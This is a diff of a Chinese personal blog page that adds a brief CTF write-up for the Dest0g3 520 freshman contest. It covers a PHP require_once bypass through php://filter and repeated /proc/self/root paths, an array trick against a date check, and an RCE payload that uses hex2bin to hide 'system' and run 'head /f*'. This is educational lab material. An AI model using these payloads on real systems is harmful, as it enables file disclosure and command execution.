@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ssti例题, shiango">
+    <meta name="keywords" content="game-week3, shiango">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ssti例题 | shiango</title>
+    <title>game-week3 | shiango</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ssti例题</h1>
+                    <h1 class="description center-align post-title">game-week3</h1>
                 </div>
             </div>
         </div>
@@ -430,9 +430,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/game/">
+                                <span class="chip bg-color">game</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -444,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-04-27
+                    2022-05-25
                 </div>
                 
 
@@ -465,7 +469,27 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h4 id="Dest0g3-520"><a href="#Dest0g3-520" class="headerlink" title="Dest0g3 520"></a>Dest0g3 520</h4><p>打完iscc,刚好找个迎新赛放放松。</p>
+<h5 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h5><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><p>1.phpdest</p>
+<p>这是一题很简单的函数绕过，我想记录的原因是因为这里也用到了一个proc：之前在做iscc的时候有一题web也是用到proc/self/cwd这个路径。这之前是自己的一个知识盲区。</p>
+<p>这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过</p>
+<p>有关require_once 绕过不能重复包含文件的限制    ：  </p>
+<p>原理</p>
+<p>php的文件包含机制是将已经包含的文件与文件的真实路径放进<strong>哈希表</strong>中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</p>
+<p>绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。 参考博客            </p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a></p>
+<p>padload:</p>
+<p><a target="_blank" rel="noopener" href="http://ab35472d-bf70-4003-9d84-579a7c3c0274.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php">http://ab35472d-bf70-4003-9d84-579a7c3c0274.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</a></p>
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">include &quot;fl4g.php&quot;; </span><br><span class="line">$dest0g3 = $_POST[&#x27;ctf&#x27;]; </span><br><span class="line">$time = date(&quot;H&quot;); </span><br><span class="line">$timme = date(&quot;d&quot;);</span><br><span class="line">$timmme = date(&quot;i&quot;);</span><br><span class="line">if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123;</span><br><span class="line">echo $fl4g; </span><br><span class="line">&#125;else&#123;   </span><br><span class="line">echo &quot;Try harder!&quot;;</span><br><span class="line">&#125; set_error_handler(</span><br><span class="line">function() use(&amp;$fl4g) &#123;   </span><br><span class="line">print $fl4g;   &#125; ); </span><br><span class="line">$fl4g .= $dest0g3; </span><br></pre></td></tr></table></figure>
+
+<p>这题的绕过就是可以用数组绕过一个时间函数，无法识别。</p>
+<p>3.rce</p>
+<p>这题学会了一种绕过命令执行system函数的新方法，就是使用<code>hex2bin()</code>函数把十六进制值的字符串转换为 ASCII 字符。</p>
+<p>padload:</p>
+<p>aaa=hex2bin(‘73797374656d’)(‘head /f*’);</p>
+<p>4.upload</p>
+
                 
             </div>
             <hr/>
@@ -491,7 +515,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/04/27/ssti%E4%BE%8B%E9%A2%98/">http://example.com/2022/04/27/ssti%E4%BE%8B%E9%A2%98/</a>
+                    <a href="http://example.com/2022/05/25/game-week3/">http://example.com/2022/05/25/game-week3/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -528,7 +552,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
+                            
+                                <a href="/tags/game/">
+                                    <span class="chip bg-color">game</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -702,13 +730,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/04/29/NSSCTF1/">
+                <a href="/2022/05/30/nssctf-1/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="NSSCTF1">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="nssctf-1">
                         
-                        <span class="card-title">NSSCTF1</span>
+                        <span class="card-title">nssctf-1</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -719,7 +747,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-29
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-30
                         </span>
                         <span class="publish-author">
                             
@@ -732,8 +760,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf%E8%B5%9B%E9%A2%98/">
-                        <span class="chip bg-color">ctf赛题</span>
+                    <a href="/tags/ctf%E9%A2%98%E7%9B%AE-web/">
+                        <span class="chip bg-color">ctf题目--web</span>
                     </a>
                     
                 </div>
@@ -747,13 +775,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/04/19/rce/">
+                <a href="/2022/05/16/misc-%E9%9A%90%E5%86%99%E6%9C%AF/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="rce">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="misc-隐写术">
                         
-                        <span class="card-title">rce</span>
+                        <span class="card-title">misc-隐写术</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -764,7 +792,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-16
                             </span>
                         <span class="publish-author">
                             
@@ -777,8 +805,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/rce/">
-                        <span class="chip bg-color">rce</span>
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
                     </a>
                     
                 </div>
